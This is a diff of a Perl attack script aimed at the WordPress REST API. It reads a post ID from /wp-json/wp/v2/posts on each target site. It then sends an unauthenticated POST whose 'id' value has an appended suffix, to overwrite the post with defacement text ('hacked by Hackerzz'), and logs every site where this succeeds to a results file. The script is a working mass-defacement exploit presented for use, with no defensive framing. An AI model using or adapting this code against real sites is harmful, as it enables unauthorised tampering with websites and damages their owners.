@@ -39,31 +39,29 @@ $ua->default_header("Content-Type" => "application/json");
 # GET Random Post ID
 $gett = $ua->get($webs."/wp-json/wp/v2/posts")->content;
 if($gett =~m/\"id\":(.*?),/g) {
+
 	$id = $1;
 
 	print "  [+] $webs JSON ID Found (".$id.")\n";
 
-#	$payload = '{  "id": "'.$id.'fff", "title": "by fucker", "content": "hacked by fucker" }';
+# Content to Inject
+$payload = '{  "id": "'.$id.'ffff", "title": "by fucker", "content": "hacked by Hackerzz" }';
+
+# Update Content
+my $req = HTTP::Request->new( 'POST', $webs."/wp-json/wp/v2/posts/".$id );
+$req->content($payload);
        
-       # Update Content 
-       $post = $ua->get($webs."wp-json/wp/v2/posts/".$id."?id=".$id."justfuck&content=by%20Hackerz")->content;
-      
-        unless($post = ~/:400/) {
-             
-            # Check if Injection Done
-            $get = $ua->get($webs."/wp-json/wp/v2/posts/")->content;
-                     if($get =~/Hackerz/) {
+  $fck = $ua->request($req)->content;
+# Check if Injection Done
+     if($fck =~/Hackerzz/) {
 	
 	                     print "\n    [+] Content Injected Succes for $webs\n\n"; 
 	                     open(save, ">>wp_json_results.txt"); 
 	                     print save "$webs\n";
                       close save; 
-                      } else { 
-	                    print "  [-] $webs Content Injected but Regex not found\n\n";
-                                   open(saEve, ">>wp_json_results_probably.txt"); 
-                                      print saEve "$webs\n";
-                                      close saEve;
-	                               } 
+                    
                         } else { print "   [-] $webs 400 Not allowed for Update\n\n"; }
 } else { print "  [-] $webs WP-JSON API not Found\n\n"; }
 }
+
+
